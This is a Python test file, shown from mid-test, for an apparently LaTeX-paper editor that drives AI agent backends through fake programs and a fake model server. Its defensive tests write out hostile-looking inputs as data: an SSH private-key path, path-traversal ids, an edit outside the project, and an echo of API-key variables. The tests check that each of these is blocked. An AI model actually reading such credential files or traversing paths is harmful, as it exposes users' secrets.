echo "{\\"type\\":\\"item.completed\\",\\"item\\":{\\"id\\":\\"1\\",\\"type\\":\\"agent_message\\",\\"text\\":\\"key=[$OPENAI_API_KEY$CODEX_API_KEY]\\"}}"
""")
    turn, events = make_turn(tmp_path)
    codex.run(turn, str(path))
    assert any(e.get("text", "").startswith("key=[]") for e in events)


def test_command_that_prints_text_edits_through_blocks(tmp_path: Path, bin_dir: Path) -> None:
    write_executable(bin_dir / "mymodel", """#!/bin/sh
prompt=$(cat)
case "$prompt" in *"Line 5 of the paper"*) ;; *) echo "the file was not in the prompt"; exit 1;; esac
printf 'Done, one line.\\n<<<<<<< SEARCH main.tex\\nLine 5 of the paper.\\n=======\\nLine five.\\n>>>>>>> REPLACE\\n'
""")
    turn, events = make_turn(tmp_path)
    from thor.agent import command as command_backend
    command_backend.run(turn, Command("m", "My model", "mymodel --fast"))
    assert [e["text"] for e in events if e["type"] == "text" and e["text"]] == ["Done, one line.\n"]
    assert "Line five.\n" in (turn.cwd / "main.tex").read_text() and turn.box.wrote


def test_command_with_prompt_in_its_arguments_that_edits_files(tmp_path: Path, bin_dir: Path) -> None:
    write_executable(bin_dir / "myagent", """#!/bin/sh
case "$2" in *"Do it."*) ;; *) exit 3;; esac
printf 'New.\\n' > made.tex
echo "Made a file."
""")
    turn, events = make_turn(tmp_path)
    from thor.agent import command as command_backend
    command_backend.run(turn, Command("m", "My agent", "myagent -p {prompt}", edits_files=True))
    assert (turn.cwd / "made.tex").read_text() == "New.\n" and turn.box.wrote
    assert events[0] == {"type": "text", "text": "Made a file.\n"}


def test_command_failures_are_told_in_words(tmp_path: Path, bin_dir: Path) -> None:
    write_executable(bin_dir / "broken", "#!/bin/sh\necho 'model not found' >&2\nexit 7\n")
    from thor.agent import command as command_backend
    turn, _ = make_turn(tmp_path)
    with pytest.raises(AgentError, match="exit code 7.*model not found"):
        command_backend.run(turn, Command("b", "Broken", "broken"))
    with pytest.raises(AgentError, match="could not start"):
        command_backend.run(turn, Command("g", "Gone", "/no/such/program"))


# A fake model server, for the OpenAI chat API and the Anthropic Messages API


class FakeModel:
    """Answers each request with the next scripted reply, and keeps the requests it saw."""

    def __init__(self) -> None:
        self.replies: list = []
        self.requests: list[dict] = []
        self.headers: list = []
        fake = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args) -> None:
                pass

            def do_GET(self) -> None:
                body = json.dumps({"data": [{"id": "model-b"}, {"id": "model-a"}]}).encode()
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_POST(self) -> None:
                request = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                fake.requests.append(request)
                fake.headers.append({k.lower(): v for k, v in self.headers.items()})
                reply = fake.replies.pop(0)
                if isinstance(reply, tuple):
                    status, text = reply
                    body = text.encode()
                    self.send_response(status)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return
                self.send_response(200)
                self.send_header("Content-Type", "text/event-stream")
                self.end_headers()
                for chunk in reply:
                    self.wfile.write(chunk.encode())
                    self.wfile.flush()

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}"


@pytest.fixture
def model():
    fake = FakeModel()
    yield fake
    fake.server.shutdown()


def chat_text(*chunks: str, usage: bool = True) -> list[str]:
    out = [f"data: {json.dumps({'choices': [{'delta': {'content': c}}]})}\n\n" for c in chunks]
    if usage:
        out.append(f"data: {json.dumps({'choices': [], 'usage': {'prompt_tokens': 11, 'completion_tokens': 3}})}\n\n")
    return [*out, "data: [DONE]\n\n"]


def chat_call(name: str, arguments: dict | str, ident: str = "call_1") -> list[str]:
    raw = arguments if isinstance(arguments, str) else json.dumps(arguments)
    middle = len(raw) // 2
    parts = [{"index": 0, "id": ident, "type": "function", "function": {"name": name, "arguments": raw[:middle]}},
             {"index": 0, "function": {"arguments": raw[middle:]}}]
    return [*[f"data: {json.dumps({'choices': [{'delta': {'tool_calls': [p]}}]})}\n\n" for p in parts], "data: [DONE]\n\n"]


def test_openai_compatible_tool_loop(tmp_path: Path, model: FakeModel) -> None:
    from thor.agent import openai_api
    model.replies = [
        chat_call("read_file", {"path": "main.tex", "line_count": 2}),
        chat_call("edit_file", {"path": "main.tex", "old_text": "Line 5 of", "new_text": "Line five of"}, "call_2"),
        chat_call("edit_file", {"path": "../outside.tex", "old_text": "x", "new_text": "y"}, "call_3"),
        chat_text("I changed ", "line 5.\n"),
    ]
    turn, events = make_turn(tmp_path, model="tiny")
    openai_api.run(turn, f"{model.url}/v1", "the-key", "Test server")
    assert "Line five of" in (turn.cwd / "main.tex").read_text()
    assert model.headers[0]["authorization"] == "Bearer the-key"
    first = model.requests[0]
    assert first["model"] == "tiny" and first["messages"][0] == {"role": "system", "content": "Be good."}
    assert {t["function"]["name"] for t in first["tools"]} >= {"read_file", "edit_file", "compile", "find_references"}
    assert "reasoning_effort" not in first
    # Results go back with the id of their call; a failed call is told to the model, which carries on.
    assert model.requests[1]["messages"][-1]["tool_call_id"] == "call_1" and "1\tLine 1" in model.requests[1]["messages"][-1]["content"]
    assert "outside the paper" in model.requests[3]["messages"][-1]["content"]
    assert "".join(e["text"] for e in events if e["type"] == "text") == "I changed line 5.\n"
    assert {"type": "usage", "input_tokens": 11, "output_tokens": 3, "cost_usd": None} in events
    assert [e["ok"] for e in events if e["type"] == "activity_done"] == [True, True, False]


def local_server(monkeypatch: pytest.MonkeyPatch, url: str) -> None:
    monkeypatch.setattr(providers, "LOCAL_SERVERS", {"ollama": ("Ollama", f"{url}/v1", "ollama_model")})


def test_a_model_server_on_this_mac_needs_no_setup(model: FakeModel, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    local_server(monkeypatch, model.url)
    agent = Settings().agent
    agent.claude_path = agent.codex_path = str(tmp_path / "absent")
    found = {p["id"]: p for p in providers.catalog(agent, MemorySecret())}
    assert found["ollama"]["ready"] and found["ollama"]["model"] == "model-a" and found["ollama"]["kind"] == "local"
    # The chosen provider is not set up, and this one is, so the agent can answer anyway.
    assert providers.effective(agent, list(found.values())) == "ollama"
    assert providers.model_of("ollama", agent) == "model-a"


def test_a_server_that_is_not_running_is_not_listed(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    local_server(monkeypatch, "http://127.0.0.1:9")
    agent = Settings().agent
    agent.claude_path = agent.codex_path = str(tmp_path / "absent")
    assert "ollama" not in {p["id"] for p in providers.catalog(agent, MemorySecret())}


def test_a_cloud_model_is_never_picked_by_itself() -> None:
    assert providers.first_local_model([{"id": "glm-5.2:cloud"}, {"id": "local:9b"}]) == "local:9b"
    assert providers.first_local_model([{"id": "glm-5.2:cloud"}]) == ""


def test_shell_wrappers_are_taken_off_codex_commands() -> None:
    assert codex.command_words("/bin/zsh -lc 'latexmk -pdf main.tex'") == "latexmk -pdf main.tex"
    assert codex.command_words("bash -c \"ls\"") == "ls"
    assert codex.command_words("latexmk -pdf main.tex") == "latexmk -pdf main.tex"


def test_a_later_turn_carries_the_whole_conversation(tmp_path: Path, model: FakeModel) -> None:
    from thor.agent import openai_api
    model.replies = [chat_text("First answer."), chat_text("Second answer.")]
    turn, _ = make_turn(tmp_path, model="tiny")
    openai_api.run(turn, model.url, None, "Test server")
    turn.prompt = "And now?"
    openai_api.run(turn, model.url, None, "Test server")
    assert [m["role"] for m in model.requests[1]["messages"]] == ["system", "user", "assistant", "user"]
    assert model.requests[1]["messages"][2]["content"] == "First answer." and "authorization" not in model.headers[0]


def test_a_model_without_tools_falls_back_to_edit_blocks(tmp_path: Path, model: FakeModel) -> None:
    from thor.agent import openai_api
    answer = "Edited.\n<<<<<<< SEARCH main.tex\nLine 5 of the paper.\n=======\nLine five.\n>>>>>>> REPLACE\n"
    model.replies = [(400, '{"error": {"message": "this model does not support tools"}}'), chat_text(answer)]
    turn, events = make_turn(tmp_path, model="tiny")
    openai_api.run(turn, model.url, None, "Test server")
    assert "tools" not in model.requests[1] and "Line 5 of the paper" in model.requests[1]["messages"][1]["content"]
    assert "Line five.\n" in (turn.cwd / "main.tex").read_text()
    assert any(e["type"] == "notice" and "cannot call tools" in e["text"] for e in events)


@pytest.mark.parametrize("status,words", [(401, "refused the API key"), (404, "does not know the model"), (429, "rate limit"), (500, "error .500.")])
def test_openai_failures_are_told_in_words(tmp_path: Path, model: FakeModel, status: int, words: str) -> None:
    from thor.agent import openai_api
    model.replies = [(status, '{"error": "nope"}')]
    turn, _ = make_turn(tmp_path, model="tiny")
    with pytest.raises(AgentError, match=words):
        openai_api.run(turn, model.url, "k", "Test server")


def test_an_endpoint_that_is_not_running_is_told_in_words(tmp_path: Path) -> None:
    from thor.agent import openai_api
    turn, _ = make_turn(tmp_path, model="tiny")
    with pytest.raises(AgentError, match="Is it running"):
        openai_api.run(turn, "http://127.0.0.1:9/v1", None, "Ollama")


def test_listing_an_endpoints_models(model: FakeModel) -> None:
    agent = Settings().agent
    agent.endpoints = [Endpoint("e", "E", f"{model.url}/v1")]
    assert [m["id"] for m in providers.list_models("endpoint:e", agent, MemorySecret())] == ["model-a", "model-b"]


def sse(kind: str, **data) -> str:
    return f"event: {kind}\ndata: {json.dumps({'type': kind, **data})}\n\n"


def anthropic_message(blocks: list[dict], stop_reason: str, input_tokens: int = 1000, output_tokens: int = 200) -> list[str]:
    out = [sse("message_start", message={"id": "msg_1", "type": "message", "role": "assistant", "model": "claude-opus-5-5",
                                         "content": [], "stop_reason": None, "stop_sequence": None,
                                         "usage": {"input_tokens": input_tokens, "output_tokens": 1}})]
    for index, block in enumerate(blocks):
        if block["type"] == "text":
            out.append(sse("content_block_start", index=index, content_block={"type": "text", "text": ""}))
            out.append(sse("content_block_delta", index=index, delta={"type": "text_delta", "text": block["text"]}))
        elif block["type"] == "thinking":
            out.append(sse("content_block_start", index=index, content_block={"type": "thinking", "thinking": "", "signature": ""}))
            out.append(sse("content_block_delta", index=index, delta={"type": "signature_delta", "signature": block["signature"]}))
        else:
            out.append(sse("content_block_start", index=index, content_block={"type": "tool_use", "id": block["id"], "name": block["name"], "input": {}}))
            out.append(sse("content_block_delta", index=index, delta={"type": "input_json_delta", "partial_json": json.dumps(block["input"])}))
        out.append(sse("content_block_stop", index=index))
    out.append(sse("message_delta", delta={"stop_reason": stop_reason, "stop_sequence": None}, usage={"output_tokens": output_tokens}))
    out.append(sse("message_stop"))
    return out


def test_anthropic_tool_loop_keeps_thinking_blocks(tmp_path: Path, model: FakeModel, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ANTHROPIC_BASE_URL", model.url)
    model.replies = [
        anthropic_message([{"type": "thinking", "signature": "sig-1"},
                           {"type": "tool_use", "id": "tu_1", "name": "edit_file",
                            "input": {"path": "main.tex", "old_text": "Line 5 of", "new_text": "Line five of"}}], "tool_use"),
        anthropic_message([{"type": "text", "text": "Done.\n"}], "end_turn", 2000, 10),
    ]
    turn, events = make_turn(tmp_path, model="claude-opus-5-5")
    anthropic_api.run(turn, "sk-ant-test")
    assert "Line five of" in (turn.cwd / "main.tex").read_text()
    first, second = model.requests
    assert first["model"] == "claude-opus-5-5" and first["thinking"] == {"type": "adaptive"}
    assert first["output_config"] == {"effort": "high"} and first["fallbacks"] == "default"
    assert "server-side-fallback-2026-07-01" in model.headers[0]["anthropic-beta"] and model.headers[0]["authorization"] == "Bearer sk-ant-test"
    assert next(t for t in first["tools"] if t["name"] == "edit_file")["eager_input_streaming"] is True
    assert any(t.get("type") == "web_search_20260209" for t in first["tools"])
    # The history goes back as it came, thinking block and all, and the tool result answers the tool call.
    assert second["messages"][1]["content"][0]["type"] == "thinking" and second["messages"][1]["content"][0]["signature"] == "sig-1"
    assert second["messages"][2]["content"][0]["tool_use_id"] == "tu_1"
    assert "".join(e["text"] for e in events if e["type"] == "text") == "Done.\n"
    assert next(e for e in events if e["type"] == "usage")["cost_usd"] == pytest.approx((1000 * 4 + 200 * 20) / 1e6)


def test_anthropic_spending_cap_stops_the_run(tmp_path: Path, model: FakeModel, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ANTHROPIC_BASE_URL", model.url)
    model.replies = [anthropic_message([{"type": "tool_use", "id": "tu_1", "name": "list_files", "input": {"path": "."}}],
                                       "tool_use", 1_000_000, 1000)]
    turn, _ = make_turn(tmp_path, model="claude-opus-5-5", budget_usd=1.0)
    with pytest.raises(AgentError, match="spending cap"):
        anthropic_api.run(turn, "k")
    assert len(model.requests) == 1


def test_anthropic_input_that_fails_validation_is_not_run(tmp_path: Path, model: FakeModel, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ANTHROPIC_BASE_URL", model.url)
    model.replies = [
        anthropic_message([{"type": "tool_use", "id": "tu_1", "name": "write_file", "input": {"path": "cut-off.tex"}}], "tool_use"),
        anthropic_message([{"type": "text", "text": "Sorry.\n"}], "end_turn"),
    ]
    turn, _ = make_turn(tmp_path, model="claude-opus-5-5")
    anthropic_api.run(turn, "k")
    result = model.requests[1]["messages"][2]["content"][0]
    assert result["is_error"] is True and "content is missing" in result["content"]
    assert not (turn.cwd / "cut-off.tex").exists()


def test_anthropic_truncated_tool_call_is_not_run(tmp_path: Path, model: FakeModel, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ANTHROPIC_BASE_URL", model.url)
    model.replies = [anthropic_message([{"type": "tool_use", "id": "tu_1", "name": "write_file",
                                         "input": {"path": "half.tex", "content": "half"}}], "max_tokens")]
    turn, _ = make_turn(tmp_path, model="claude-opus-5-5")
    with pytest.raises(AgentError, match="ran out of room"):
        anthropic_api.run(turn, "k")
    assert not (turn.cwd / "half.tex").exists()


def test_anthropic_refusal_and_bad_key(tmp_path: Path, model: FakeModel, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ANTHROPIC_BASE_URL", model.url)
    model.replies = [anthropic_message([], "refusal")]
    turn, _ = make_turn(tmp_path, model="claude-opus-5-5")
    with pytest.raises(AgentError, match="declined"):
        anthropic_api.run(turn, "k")
    model.replies = [(401, json.dumps({"type": "error", "error": {"type": "authentication_error", "message": "bad"}}))]
    (tmp_path / "again").mkdir()
    turn, _ = make_turn(tmp_path / "again", model="claude-opus-5-5")
    with pytest.raises(AgentError, match="refused the API key"):
        anthropic_api.run(turn, "k")


def test_may_read_is_the_paper_its_results_and_latex(tmp_path: Path) -> None:
    from thor.agent.claude_code import may_read
    work, results = tmp_path / "work", tmp_path / "results"
    work.mkdir()
    results.mkdir()
    assert may_read("main.tex", work, []) and may_read(str(work / "sub" / "x.tex"), work, [])
    assert may_read(str(results / "a.csv"), work, [results])
    assert may_read("/usr/local/texlive/2026/texmf-dist/tex/latex/base/article.cls", work, [])
    for path in ("/Users/me/.ssh/id_rsa", "../other.tex", str(results / "a.csv"), str(tmp_path / "work-not" / "x")):
        assert not may_read(path, work, [])


def test_older_and_unknown_models_get_no_new_parameters(tmp_path: Path) -> None:
    turn, _ = make_turn(tmp_path, model="claude-haiku-4-5")
    params = anthropic_api.request_params(turn)
    assert "thinking" not in params and "output_config" not in params and "fallbacks" not in params
    assert not any(t.get("type", "").startswith("web_search") for t in params["tools"])


# Through the HTTP API


class IdleSetup(FirstRun):
    def __init__(self, tmp: Path) -> None:
        super().__init__(TexInstaller(downloads=tmp / "dl", search=lambda: [], texbin=tmp / "texbin"), enabled=False)


@pytest.fixture
def client(tmp_path: Path) -> TestClient:
    app = create_app(TOKEN, MemorySecret(), ui_dir=None, store=Store(tmp_path / "test.db"), settings_store=SettingsStore(),
                     setup=IdleSetup(tmp_path), history=History(tmp_path / "history"))
    return TestClient(app, base_url=BASE, headers={"Authorization": f"Bearer {TOKEN}"})


@pytest.fixture
def opened(client: TestClient, tmp_path: Path) -> str:
    root, _ = project(tmp_path)
    (root / "tex" / "main.tex").write_text("\\documentclass{article}\n\\begin{document}\n" + TEXT + "\\end{document}\n")
    return client.post("/api/projects/open", json={"path": str(root)}).json()["id"]


def use_command(client: TestClient, command: str, edits_files: bool = False) -> None:
    got = client.get("/api/settings").json()
    # Unsandboxed: the fake programs here report what they were sent by writing outside the copy.
    agent = {**got["agent"], "provider": "command:m", "commands": [{"id": "m", "name": "Mine", "command": command, "edits_files": edits_files, "sandboxed": False}]}
    assert client.put("/api/settings", json={"agent": agent}).status_code == 200


def finish(client: TestClient, pid: str, chat: str) -> dict:
    for _ in range(600):
        state = client.get(f"/api/projects/{pid}/agent/chats/{chat}").json()
        if not state["running"] and state["events"] and state["events"][-1]["type"] == "done":
            return state
        time.sleep(0.05)
    raise AssertionError("The turn did not finish.")


def test_a_turn_from_message_to_accepted_edit(client: TestClient, opened: str, bin_dir: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("THOR_TOOL_PATH", f"{bin_dir}:/Library/TeX/texbin:/usr/bin:/bin")
    write_executable(bin_dir / "mymodel", """#!/bin/sh
cat > "$THOR_TEST_PROMPT"
printf 'One edit.\\n<<<<<<< SEARCH main.tex\\nLine 5 of the paper.\\n=======\\nLine five.\\n>>>>>>> REPLACE\\n'
""")
    prompt_file = tmp_path / "prompt.txt"
    monkeypatch.setenv("THOR_TEST_PROMPT", str(prompt_file))
    use_command(client, "mymodel")
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    context = {"file": "tex/main.tex", "line": 3, "selection": {"from": 3, "to": 4, "text": "Line 1 of the paper."}}
    assert client.post(f"{base}/{chat}/messages", json={"text": "Fix line 5.", "context": context}).status_code == 200
    state = finish(client, opened, chat)
    kinds = [e["type"] for e in state["events"]]
    assert kinds[0] == "user" and "changes" in kinds and "error" not in kinds and state["title"] == "Fix line 5."
    assert state["events"][0]["provider_name"] == "Mine"

    prompt = prompt_file.read_text()
    assert "Fix line 5." in prompt and "has tex/main.tex open, with the cursor on line 3" in prompt and "selected lines 3-4" in prompt
    assert "--- main.tex" in prompt and "SEARCH" in prompt

    # The project is untouched until the user says so.
    root = Path(client.get(f"/api/projects/{opened}").json()["root"])
    assert "Line 5 of the paper." in (root / "tex" / "main.tex").read_text()
    changes = client.get(f"{base}/{chat}/changes").json()
    assert changes["files"][0]["path"] == "tex/main.tex" and changes["build"]["ok"] is True
    assert client.get(f"{base}/{chat}/pdf").headers["content-type"] == "application/pdf"
    hunk = changes["files"][0]["hunks"][0]["id"]
    after = client.post(f"{base}/{chat}/changes/accept", json={"path": "tex/main.tex", "hunk": hunk}).json()
    assert after["written"] == ["tex/main.tex"] and after["files"] == []
    assert "Line five." in (root / "tex" / "main.tex").read_text()
    versions = client.get(f"/api/projects/{opened}/history", params={"path": "tex/main.tex"}).json()["versions"]
    assert versions[0]["label"] == "Agent edit accepted"


def test_a_rejected_edit_is_told_to_the_agent_next_turn(client: TestClient, opened: str, bin_dir: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    write_executable(bin_dir / "mymodel", """#!/bin/sh
cat > "$THOR_TEST_PROMPT"
case "$(cat "$THOR_TEST_PROMPT")" in
*"First"*) printf '<<<<<<< SEARCH main.tex\\nLine 5 of the paper.\\n=======\\nLine five.\\n>>>>>>> REPLACE\\n';;
esac
echo "Answered."
""")
    prompt_file = tmp_path / "prompt.txt"
    monkeypatch.setenv("THOR_TEST_PROMPT", str(prompt_file))
    use_command(client, "mymodel")
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    client.post(f"{base}/{chat}/messages", json={"text": "First"})
    finish(client, opened, chat)
    assert client.post(f"{base}/{chat}/changes/reject", json={}).json()["files"] == []
    client.post(f"{base}/{chat}/messages", json={"text": "Second"})
    finish(client, opened, chat)
    prompt = prompt_file.read_text()
    assert "rejected these edits" in prompt and "Line five." in prompt and "User: First" in prompt


def test_stop_ends_a_running_command(client: TestClient, opened: str, bin_dir: Path) -> None:
    write_executable(bin_dir / "slow", "#!/bin/sh\ncat > /dev/null\necho started\nexec sleep 30\n")
    use_command(client, "slow")
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    client.post(f"{base}/{chat}/messages", json={"text": "Go"})
    assert client.post(f"{base}/{chat}/messages", json={"text": "Again"}).status_code == 409
    assert client.delete(f"{base}/{chat}").status_code == 409
    assert client.post(f"{base}/{chat}/changes/accept", json={}).status_code == 409
    client.post(f"{base}/{chat}/stop")
    state = finish(client, opened, chat)
    assert any(e["type"] == "notice" and e["text"] == "Stopped." for e in state["events"])
    assert client.delete(f"{base}/{chat}").status_code == 200
    assert client.get(f"{base}/{chat}").status_code == 404


def test_a_failed_provider_shows_its_words(client: TestClient, opened: str, bin_dir: Path) -> None:
    write_executable(bin_dir / "broken", "#!/bin/sh\ncat > /dev/null\necho 'no such model' >&2\nexit 4\n")
    use_command(client, "broken")
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    client.post(f"{base}/{chat}/messages", json={"text": "Go"})
    state = finish(client, opened, chat)
    assert next(e for e in state["events"] if e["type"] == "error")["text"].endswith("no such model")


def test_events_stream_ends_when_the_turn_is_done(client: TestClient, opened: str, bin_dir: Path) -> None:
    write_executable(bin_dir / "quick", "#!/bin/sh\ncat > /dev/null\necho 'Line one.'\necho 'Line two.'\n")
    use_command(client, "quick")
    base = f"/api/projects/{opened}/agent/chats"
    chat = client.post(base).json()["id"]
    client.post(f"{base}/{chat}/messages", json={"text": "Go"})
    finish(client, opened, chat)
    body = client.get(f"{base}/{chat}/events", params={"after": 1}).text
    assert '"text": "Line one.\\n' in body and body.rstrip().endswith("data: {}")


def test_agent_routes_need_the_token_and_check_their_ids(client: TestClient, opened: str, tmp_path: Path) -> None:
    anonymous = TestClient(client.app, base_url=BASE)
    assert anonymous.get(f"/api/projects/{opened}/agent/chats").status_code == 401
    assert anonymous.get("/api/agent/providers").status_code == 401
    assert anonymous.put("/api/agent/keys/openai_api", json={"key": "x"}).status_code == 401
    for bad in ("..%2F..%2Fsecret", "ABC", "../x"):
        assert client.get(f"/api/projects/{opened}/agent/chats/{bad}").status_code == 404
    assert client.put("/api/agent/keys/nobody", json={"key": "x"}).status_code == 404


def test_keys_go_to_the_keychain_and_never_into_settings(client: TestClient, opened: str) -> None:
    got = client.get("/api/settings").json()
    agent = {**got["agent"], "endpoints": [{"id": "e", "name": "E", "base_url": "https://example.org/v1", "model": "m"}]}
    client.put("/api/settings", json={"agent": agent})
    assert client.put("/api/agent/keys/endpoint:e", json={"key": " the-secret "}).json() == {"saved": True}
    assert client.put("/api/agent/keys/openai_api", json={"key": "another-secret"}).json() == {"saved": True}
    found = {p["id"]: p for p in client.get("/api/agent/providers").json()["providers"]}
    assert found["endpoint:e"]["has_key"] is True and found["openai_api"]["has_key"] is True
    assert "secret" not in json.dumps(client.get("/api/settings").json())
    assert "secret" not in json.dumps(found)
    home = Path(SettingsStore().path)
    assert "secret" not in home.read_text()
    assert client.delete("/api/agent/keys/endpoint:e").json() == {"saved": False}
